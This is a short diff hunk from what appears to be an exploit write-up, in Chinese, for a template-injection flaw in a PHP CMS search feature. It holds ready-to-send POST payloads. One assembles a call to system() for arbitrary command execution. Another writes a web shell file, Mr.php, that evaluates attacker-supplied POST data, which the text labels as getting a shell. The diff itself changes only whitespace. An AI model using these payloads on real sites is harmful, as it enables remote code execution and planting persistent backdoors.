@@ -3,6 +3,6 @@
 PostData:      
 	searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=sys&9[]=tem('cmd');
 	可执行任意命令      
-PostData:
-    searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=fwrite(&9[]=fopen('Mr.php','w')&9[]=,'<?php eval($_POST["Mr"]);?>');
+PostData:          
+    searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=fwrite(&9[]=fopen('Mr.php','w')&9[]=,'<?php eval($_POST["Mr"]);?>');         
     可GetShell
